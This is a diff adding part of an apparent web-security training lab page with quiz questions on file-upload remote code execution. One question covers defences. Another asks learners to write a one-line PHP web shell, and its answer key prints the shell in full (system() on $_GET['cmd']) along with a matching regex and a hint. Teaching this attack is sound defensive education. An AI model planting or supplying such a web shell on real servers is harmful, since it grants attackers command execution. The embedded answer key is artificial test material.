+          <div class="quiz-question">Q5: Best fix for the file-upload RCE?</div>
+          <div class="quiz-options">
+            <button type="button" class="quiz-option" data-correct="false" data-feedback="Blacklisting .php misses .phtml, .php5, null bytes, and more. Blacklists always leak.">A) Block any filename containing ".php".</button>
+            <button type="button" class="quiz-option" data-correct="true" data-feedback="Right. Verify the real content, rename server-side, and store where files can't execute. Defense that doesn't depend on the attacker's filename.">B) Validate real content, rename server-side, and store where nothing executes.</button>
+            <button type="button" class="quiz-option" data-correct="false" data-feedback="A size cap limits big files but does nothing to stop a one-line web shell.">C) Limit uploads to 1 MB.</button>
+          </div>
+          <div class="quiz-feedback"></div>
+        </div>
+
+        <div class="quiz-card" data-question-id="lab06-q6"
+          data-expected-regex="&lt;\?php\s+system\s*\(\s*\$_(GET|POST|REQUEST)\s*\[\s*['&quot;]?\w+['&quot;]?\s*\]\s*\)\s*;?\s*\?&gt;"
+          data-solution-rationale="A standard PHP web shell passes a request parameter into system(), e.g. &lt;?php system($_GET['cmd']); ?&gt;. passthru() and exec() are also accepted ideas, but the drill here is the system()+$_GET pattern."
+          data-hint="One line. Call system() on a value you pull from $_GET, then wrap it in &lt;?php ... ?&gt;.">
+          <div class="quiz-question">Q6 [Payload]: Write a one-line PHP web shell that runs whatever command is in the <code>cmd</code> URL parameter.</div>
+          <div class="quiz-input-group">
+            <input type="text" class="quiz-input" placeholder="&lt;?php system(...); ?&gt;" spellcheck="false" autocomplete="off" />
+            <button type="button" class="quiz-submit-btn">Execute</button>
+          </div>
+          <div class="quiz-feedback"></div>
+        </div>
+      </section>
+
+    </main>
+  </div>
+
+  <div data-site-footer></div>
+
+  <script data-site-root=".." src="../assets/js/site.js"></script>
+  <script src="../assets/js/vendor/qrcode.js"></script>
+  <script src="../assets/js/lab-common.js"></script>
+  <script src="../assets/js/quiz.js"></script>
+</body>
+</html>
